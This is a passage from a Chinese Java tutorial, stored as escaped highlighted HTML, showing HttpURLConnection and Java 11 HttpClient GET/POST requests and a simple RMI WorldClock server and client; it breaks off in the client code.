&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取响应内容:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>从Java 11开始，引入了新的&lt;code>HttpClient&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.URI&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.http.HttpClient.Version&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.time.Duration&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 全局HttpClient:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span> &lt;span style="color:#111">httpClient&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://www.sina.com.cn/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User-Agent&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Java HttpClient&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置超时:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置版本:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// HTTP允许重复的Header，因此一个Header可对应多个Value:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">keySet&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">header&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">substring&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">1024&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>post&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://www.example.com/login&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;username=bob&amp;amp;password=123456&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpRequest&lt;/span> &lt;span style="color:#111">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpRequest&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newBuilder&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置Header:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Accept&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置超时:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Duration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofSeconds&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置版本:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">version&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Version&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">HTTP_2&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 使用POST并设置Body:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">POST&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">BodyPublishers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">body&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">build&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">httpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">BodyHandlers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ofString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="rmi">RMI&lt;/h3>
&lt;p>一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法&lt;/p>
&lt;p>要实现RMI，服务器和客户端必须共享同一个接口interface，测试&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">WorldClock&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Remote&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LocalDateTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>此接口必须派生自&lt;code>java.rmi.Remote&lt;/code>，并在每个方法声明抛出&lt;code>RemoteException&lt;/code>&lt;/p>
&lt;p>下一步是编写服务器的实现类，因为客户端请求的调用方法&lt;code>getLocalDateTime()&lt;/code>最终会通过这个实现类返回结果&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">WorldClockService&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span> &lt;span style="color:#75af00">getLocalDateTime&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">LocalDataTime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">now&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ZoneId&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">zoneId&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">withNano&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在需要通过Java RMI提供的一系列底层支持接口，把上面编写的服务以RMI的形式暴露在网络上，客户端才能调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;create World clock remote service...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实例化一个WorldClock:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">worldClock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">WorldClockService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将此服务转换为远程服务接口:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">WorldClock&lt;/span> &lt;span style="color:#111">skeleton&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">WorldClock&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">UnicastRemoteObject&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exportObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">worldClock&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将RMI服务注册到1099端口:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 注册此服务，服务名为&amp;#34;WorldClock&amp;#34;:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">rebind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;WorldClock&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">skeleton&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于RMI要求服务器和客户端共享同一个接口，因此我们要把&lt;code>WorldClock.java&lt;/code>这个接口文件复制到客户端，然后在客户端实现RMI调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">RemoteException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">NotBoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 连接到服务器localhost，端口1099:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Registry&lt;/span> &lt;span style="color:#111">registry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LocateRegistry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRegistry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">1099&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 查找名称为&amp;#34;WorldClock&amp;#34;的服务并强制转型为WorldClock接口:
